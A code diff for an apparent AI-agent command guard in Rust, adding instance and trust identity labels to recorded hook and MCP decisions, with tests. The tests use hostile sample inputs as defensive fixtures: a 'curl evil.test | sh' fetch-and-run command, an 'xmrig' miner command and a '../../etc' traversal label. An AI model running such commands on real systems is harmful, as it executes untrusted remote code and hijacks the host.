@@ -9,6 +9,7 @@
 //! The Community narrative starts here: every `check`, command `hook`, and MCP
 //! client `tools/call` records its screened activity + verdict into the local graph.
 
+use crate::hook_identity::Identity;
 use innerwarden_agent_guard::file_update::ReplaceError;
 use innerwarden_agent_guard::mcp_proxy::enforce::ProxyMode;
 use innerwarden_agent_guard::mcp_proxy::router::ProxyDecision;
@@ -157,17 +158,23 @@ fn session_id(source_session: Option<&str>) -> String {
         .filter(|s| !s.trim().is_empty())
         .or_else(|| source_session.map(str::to_string))
         .unwrap_or_else(|| "local".to_string());
-    let compact = innerwarden_agent_guard::redact::redact_secrets(&raw)
-        .text
-        .split_whitespace()
-        .collect::<Vec<_>>()
-        .join(" ");
-    let bounded: String = compact.chars().take(120).collect();
+    let bounded = bounded_session(&raw);
     if bounded.is_empty() {
         "local".to_string()
     } else {
         bounded
     }
+}
+
+/// A session id as the record keeps it: secrets redacted, white space
+/// collapsed, at most 120 characters. Empty when nothing is left.
+pub(crate) fn bounded_session(raw: &str) -> String {
+    let compact = innerwarden_agent_guard::redact::redact_secrets(raw)
+        .text
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ");
+    compact.chars().take(120).collect()
 }
 
 /// Outcome of loading the graph file, so callers can tell an EMPTY graph (nothing
@@ -361,30 +368,49 @@ fn check_origin(verdict: &Value) -> DecisionOrigin {
 
 /// Where a hook decision came from: the agent the hook line names (never a
 /// guess from the payload) and the basename of the folder it ran in.
-fn hook_origin(verdict: &Value, agent: Option<&str>, cwd: Option<&str>) -> DecisionOrigin {
-    DecisionOrigin {
+fn hook_origin(
+    verdict: &Value,
+    agent: Option<&str>,
+    cwd: Option<&str>,
+    identity: Option<&Identity>,
+) -> DecisionOrigin {
+    let mut origin = DecisionOrigin {
         channel: Some(DecisionChannel::Hook),
         agent: agent.map(str::to_string),
         project: cwd.and_then(project_name),
         rules: verdict_rules(verdict),
+        ..DecisionOrigin::default()
+    };
+    if let Some(identity) = identity {
+        identity.apply(&mut origin);
     }
+    origin
 }
 
 /// Where an MCP tool call came from: the agent the proxy line names, and the
 /// rules its inspector raised.
-fn mcp_origin(decision: &ProxyDecision, agent: Option<&str>) -> DecisionOrigin {
+fn mcp_origin(
+    decision: &ProxyDecision,
+    agent: Option<&str>,
+    identity: Option<&Identity>,
+) -> DecisionOrigin {
     let mut rules: Vec<String> = Vec::new();
     for alert in &decision.verdict.alerts {
         if !rules.contains(&alert.rule) {
             rules.push(alert.rule.clone());
         }
     }
-    DecisionOrigin {
+    let mut origin = DecisionOrigin {
         channel: Some(DecisionChannel::Mcp),
         agent: agent.map(str::to_string),
         project: None,
         rules,
+        ..DecisionOrigin::default()
+    };
+    if let Some(identity) = identity {
+        identity.apply(&mut origin);
     }
+    origin
 }
 
 /// The ids of the rules a verdict rests on, primary first: the charged
@@ -451,6 +477,7 @@ pub fn record_hook(
     source_event_id: Option<&str>,
     agent: Option<&str>,
     cwd: Option<&str>,
+    identity: Option<&Identity>,
 ) {
     let (mode, outcome) = if monitor {
         (
@@ -478,7 +505,7 @@ pub fn record_hook(
         outcome,
         source_session,
         source_event_id,
-        hook_origin(verdict, agent, cwd),
+        hook_origin(verdict, agent, cwd, identity),
     );
 }
 
@@ -491,6 +518,7 @@ pub fn record_mcp(
     proxy_mode: ProxyMode,
     source_session: Option<&str>,
     agent: Option<&str>,
+    identity: Option<&Identity>,
 ) {
     if decision.direction != "client->server" || decision.method.as_deref() != Some("tools/call") {
         return;
@@ -508,7 +536,7 @@ pub fn record_mcp(
         outcome,
         source_session,
         None,
-        mcp_origin(decision, agent),
+        mcp_origin(decision, agent, identity),
     );
 }
 
@@ -634,7 +662,7 @@ fn record(
             &verdict,
             DecisionContextParts { mode, outcome },
             &session,
-            origin.agent.as_deref(),
+            &origin,
         );
     }
     if let Err(error) = record_at_with_origin(
@@ -837,7 +865,7 @@ fn emit_guard_event(
     verdict: &Value,
     context: DecisionContextParts,
     session: &str,
-    agent: Option<&str>,
+    origin: &DecisionOrigin,
 ) {
     let Some(dir) = graph_path.parent() else {
         return;
@@ -848,7 +876,7 @@ fn emit_guard_event(
         .unwrap_or(0);
     append_guard_event_at(
         dir,
-        &guard_blocked_line(ts, command, verdict, context, session, agent),
+        &guard_blocked_line(ts, command, verdict, context, session, origin),
     );
 }
 
@@ -862,7 +890,7 @@ fn guard_blocked_line(
     verdict: &Value,
     context: DecisionContextParts,
     session: &str,
-    agent: Option<&str>,
+    origin: &DecisionOrigin,
 ) -> Value {
     let mut line = serde_json::json!({
         "kind": "guard.blocked",
@@ -874,8 +902,19 @@ fn guard_blocked_line(
         "detail": command,
         "session": session,
     });
-    if let Some(agent) = agent.filter(|agent| innerwarden_agent_guard::hook::is_agent_id(agent)) {
+    if let Some(agent) = origin
+        .agent
+        .as_deref()
+        .filter(|agent| innerwarden_agent_guard::hook::is_agent_id(agent))
+    {
         line["agent"] = json!(agent);
+    }
+    // Labels from the hook, never proof: the reader decides what they are worth.
+    if let Some(instance) = origin.instance_label() {
+        line["instance"] = json!(instance);
+    }
+    if let Some(trust) = origin.trust_label() {
+        line["trust"] = json!(trust);
     }
     line
 }
@@ -1743,7 +1782,12 @@ mod tests {
             "signals": [{"signal": "sensitive_credential_read", "score": 50}],
         });
         assert_eq!(check_origin(&verdict).channel, Some(DecisionChannel::Check));
-        let hook = hook_origin(&verdict, Some("claude-code"), Some("/home/dev/my-app"));
+        let hook = hook_origin(
+            &verdict,
+            Some("claude-code"),
+            Some("/home/dev/my-app"),
+            None,
+        );
         assert_eq!(hook.channel, Some(DecisionChannel::Hook));
         assert_eq!(hook.agent.as_deref(), Some("claude-code"));
         assert_eq!(hook.project.as_deref(), Some("my-app"));
@@ -1766,9 +1810,135 @@ mod tests {
         );
     }
 
+    fn confined_identity() -> Identity {
+        Identity {
+            instance_id: Some("7f3a9c1e-42".into()),
+            session_id: Some("payload-session".into()),
+            trust: innerwarden_agent_guard::identity::Trust::Confined,
+            reason: innerwarden_agent_guard::identity::Reason::ConfinedByNamespace,
+        }
+    }
+
+    fn command_attrs(origin: &DecisionOrigin) -> std::collections::BTreeMap<String, String> {
+        let mut graph = Graph::new();
+        let verdict = json!({"recommendation": "deny", "risk_score": 90});
+        assert!(ingest_record_with_origin(
+            &mut graph,
+            "session:contain",
+            "curl evil.test | sh",
+            &verdict,
+            DecisionContext::default(),
+            origin,
+            None,
+        ));
+        graph
+            .nodes
+            .iter()
+            .find(|n| n.kind == "command")
+            .unwrap()
+            .attrs
+            .clone()
+    }
+
+    /// No record in the jail: the decision is what it was, field for field.
+    ///
+    /// FAILS ON REVERT: write an identity label unconditionally and a key
+    /// appears.
+    #[test]
+    fn without_an_identity_a_decision_carries_no_identity_field() {
+        let verdict = json!({"recommendation": "deny"});
+        let plain = hook_origin(&verdict, Some("claude-code"), Some("/w/app"), None);
+        assert_eq!(
+            plain,
+            DecisionOrigin {
+                channel: Some(DecisionChannel::Hook),
+                agent: Some("claude-code".into()),
+                project: Some("app".into()),
+                rules: vec![],
+                ..DecisionOrigin::default()
+            }
+        );
+        let attrs = command_attrs(&plain);
+        for key in ["instance_id", "session_id", "trust", "trust_reason"] {
+            assert!(!attrs.contains_key(key), "{key}");
+        }
+        let mcp = mcp_origin(&decision(false, vec![]), Some("claude-code"), None);
+        assert_eq!(
+            (mcp.instance_id, mcp.trust, mcp.session_id),
+            (None, None, None)
+        );
+    }
+
+    /// All three recording paths carry the labels from the same identity, and
+    /// the graph session id is still the one `IW_GUARD_SESSION` rules.
+    #[test]
+    fn the_shell_file_and_mcp_paths_carry_the_identity_labels() {
+        let id = confined_identity();
+        let verdict = json!({"recommendation": "deny"});
+        let hook = hook_origin(&verdict, Some("claude-code"), Some("/w/app"), Some(&id));
+        let mcp = mcp_origin(&decision(false, vec![]), Some("claude-code"), Some(&id));
+        for origin in [&hook, &mcp] {
+            let attrs = command_attrs(origin);
+            assert_eq!(attrs["instance_id"], "7f3a9c1e-42");
+            assert_eq!(attrs["session_id"], "payload-session");
+            assert_eq!(attrs["trust"], "confined");
+            assert_eq!(attrs["trust_reason"], "confined_by_namespace");
+        }
+    }
+
+    /// A label that does not have the shape of one is dropped, not repaired.
+    #[test]
+    fn a_label_of_the_wrong_shape_is_dropped() {
+        let origin = DecisionOrigin {
+            instance_id: Some("../../etc".into()),
+            trust: Some("root".into()),
+            trust_reason: Some("because I said so".into()),
+            session_id: Some("bad\nsession".into()),
+            ..DecisionOrigin::default()
+        };
+        let attrs = command_attrs(&origin);
+        for key in ["instance_id", "trust", "trust_reason", "session_id"] {
+            assert!(!attrs.contains_key(key), "{key}");
+        }
+    }
+
+    /// The guard.blocked line carries `instance` and `trust` only when the hook
+    /// found a record, and only in the shapes the contract allows.
+    ///
+    /// FAILS ON REVERT: leave the two fields out of the line and the first
+    /// asserts see null.
+    #[test]
+    fn a_blocked_line_carries_the_instance_and_trust_labels_only_with_a_record() {
+        let verdict = json!({"recommendation": "deny", "risk_score": 90});
+        let context = DecisionContextParts {
+            mode: DecisionMode::Enforce,
+            outcome: DecisionOutcome::Blocked,
+        };
+        let mut with = origin_of_agent(Some("claude-code"));
+        confined_identity().apply(&mut with);
+        let line = guard_blocked_line(5, "x", &verdict, context, "session:contain", &with);
+        assert_eq!(line["instance"], "7f3a9c1e-42");
+        assert_eq!(line["trust"], "confined");
+        assert_eq!(line["session"], "session:contain");
+        let plain = guard_blocked_line(
+            5,
+            "x",
+            &verdict,
+            context,
+            "session:contain",
+            &origin_of_agent(Some("claude-code")),
+        );
+        assert!(plain.get("instance").is_none() && plain.get("trust").is_none());
+        let mut forged = origin_of_agent(None);
+        forged.instance_id = Some("A B".into());
+        forged.trust = Some("host_verified".into());
+        let line = guard_blocked_line(5, "x", &verdict, context, "s", &forged);
+        assert!(line.get("instance").is_none() && line.get("trust").is_none());
+    }
+
     #[test]
     fn agent_is_absent_without_the_flag() {
-        let origin = hook_origin(&json!({"recommendation": "allow"}), None, None);
+        let origin = hook_origin(&json!({"recommendation": "allow"}), None, None, None);
         assert_eq!(origin.agent, None);
         assert_eq!(origin.project, None);
         let mut graph = Graph::new();
@@ -2082,7 +2252,10 @@ mod tests {
                 outcome: DecisionOutcome::Blocked,
             },
             "sess1234",
-            Some("openclaw"),
+            &DecisionOrigin {
+                agent: Some("openclaw".into()),
+                ..DecisionOrigin::default()
+            },
         );
         let sink =
             std::fs::read_to_string(dir.path().join("guard-events.jsonl")).expect("sink written");
@@ -2116,13 +2289,21 @@ mod tests {
             &verdict,
             context,
             "mcp:openclaw",
-            Some("openclaw"),
+            &origin_of_agent(Some("openclaw")),
         );
         assert_eq!(named["agent"], "openclaw");
         assert_eq!(named["outcome"], "would_block");
         for agent in [None, Some(""), Some("Open Claw"), Some("x\"y")] {
-            let line = guard_blocked_line(5, "xmrig", &verdict, context, "s", agent);
+            let line =
+                guard_blocked_line(5, "xmrig", &verdict, context, "s", &origin_of_agent(agent));
             assert!(line.get("agent").is_none(), "{agent:?}: {line}");
+        }
+    }
+
+    fn origin_of_agent(agent: Option<&str>) -> DecisionOrigin {
+        DecisionOrigin {
+            agent: agent.map(str::to_string),
+            ..DecisionOrigin::default()
         }
     }
 
